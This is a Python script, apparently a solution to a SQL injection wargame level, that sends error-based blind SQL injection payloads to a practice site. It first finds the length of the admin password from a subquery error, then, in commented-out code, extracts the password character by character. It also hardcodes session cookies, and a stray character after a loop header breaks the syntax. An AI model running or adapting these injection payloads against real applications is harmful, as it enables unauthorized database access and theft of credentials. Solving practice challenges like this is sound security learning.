import requests
from bs4 import BeautifulSoup



request_header = {
	"Accept": "*/*",
	'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac Os X 10_9_5) AppleWebKit 537.36 (KHMTL, like Gecko) Chrome',
	'Accept-Language': 'ko-KR,ko;q=0.8,en-US;q=0.6,en;q=0.4'
}
target_url = "https://los.eagle-jump.org/xavis_fd4389515d6540477114ec3c79623afe.php"
target_url = "https://los.eagle-jump.org/iron_golem_d54668ae66cb6f43e92468775b1d1e38.php"


s =  requests.session()
cookies = {"__cfduid":"dea80bf0edb4998f73e2bfa300ad2205c1555395056","PHPSESSID":"5rvtkj1ih2galu0lv8m5md2is7"}

query = "?pw=1%27%20or%20id=%27admin%27%20and%20if(length(pw)={},1,(select%201%20union%20select%202))%20and%20%271%27=%271"
length = 0
for i in range(1,20):7

	print("query : " ,target_url+query.format(i))
	html = s.get(target_url+query.format(i),headers=request_header,cookies=cookies)
	bs_obj = BeautifulSoup(html.text,'html.parser')
	if 'Subquery' in bs_obj.text:
		
		length = i-1
		break

attack_query = "?pw=1%27%20or%20id=%27admin%27%20and%20if(ord(substr(pw,{},1))%3E{},1,(select%201%20union%20select%202))%20and%20%271%27=%271"
# print("length :" ,length)
# word_list = []
# for i in range(1,length+1):
# 	print("%d번째" % i)
# 	for j in range(1,123):
# 		html = s.get(target_url+attack_query.format(i,j),headers=request_header,cookies=cookies)
# 		bs_obj = BeautifulSoup(html.text,'html.parser')

# 		if 'Subquery' in bs_obj.text:
# 			word_list.append(j-1)
# 			break
# 	else:
# 		print('none')
# print(word_list)
# # 